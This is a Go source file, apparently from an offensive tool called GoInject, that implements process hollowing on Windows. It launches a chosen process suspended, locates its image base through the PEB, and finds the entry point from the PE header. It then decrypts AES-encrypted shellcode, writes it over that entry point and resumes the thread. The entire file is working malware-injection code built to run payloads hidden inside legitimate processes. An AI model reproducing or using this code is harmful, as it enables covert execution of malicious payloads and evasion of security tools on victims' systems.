package techniques

import (
	"encoding/hex"
	"unsafe"
	"encoding/binary"
	"GoInject/crypto"
	"golang.org/x/sys/windows"
)


type ProcessBasicInformation struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessID uintptr
	InheritedFromUniqueProcessID uintptr
}

var	readProcessMemory = kernel32.MustFindProc("ReadProcessMemory")



func ProcessHollowing(procToHollow string, shellcodeEncrypted string, key string){


	cProcessUTF16, _ := windows.UTF16PtrFromString(procToHollow)

	pi := windows.ProcessInformation{}
	pbi := ProcessBasicInformation{}
	si := windows.StartupInfo{}

	pbiLength := uint32(unsafe.Sizeof(pbi))

	//create provided process to hollow in suspended mode
	windows.CreateProcess(nil , cProcessUTF16, nil, nil, false, uint32(windows.CREATE_SUSPENDED), nil, nil, &si, &pi)

	var size uintptr
	hProcess := pi.Process

	//returns info about the process, including its PEB address, to pbi.
	windows.NtQueryInformationProcess(hProcess, windows.ProcessBasicInformation , unsafe.Pointer(&pbi), pbiLength, nil)
	
	//Pointer to the image base of the process, located at offset 0x10 from the PEB base address
	ImageBasePtr := uintptr(int(pbi.PebBaseAddress) + 0x10)

	addrBuffSize := unsafe.Sizeof(size)
	addrBuff := make([]byte, addrBuffSize)

	nRead := uintptr(0)

	readProcessMemory.Call(uintptr(hProcess), ImageBasePtr, uintptr(unsafe.Pointer(&addrBuff[0])), addrBuffSize, nRead)

	svchostBase := uintptr(binary.LittleEndian.Uint64(addrBuff))
	data := make([]byte, 300)
	readProcessMemory.Call(uintptr(hProcess), svchostBase, uintptr(unsafe.Pointer(&data[0])), 300, nRead)
	
	e_lfanew_offset := binary.LittleEndian.Uint32(data[0x3c:])
    opthdr :=  e_lfanew_offset + 0x28
	entrypoint_rva := uint(binary.LittleEndian.Uint32(data[opthdr:]))
	addressOfEntryPoint := uintptr(entrypoint_rva+uint(svchostBase))

	
        plaintext := crypto.DecryptAES(shellcodeEncrypted, key)

	shellcode, _ := hex.DecodeString(string(plaintext))

	shellcodeSize := len(shellcode)
	var outSize uintptr
	windows.WriteProcessMemory(hProcess, addressOfEntryPoint, &shellcode[0], uintptr(shellcodeSize), &outSize) 
	windows.ResumeThread(pi.Thread)
}
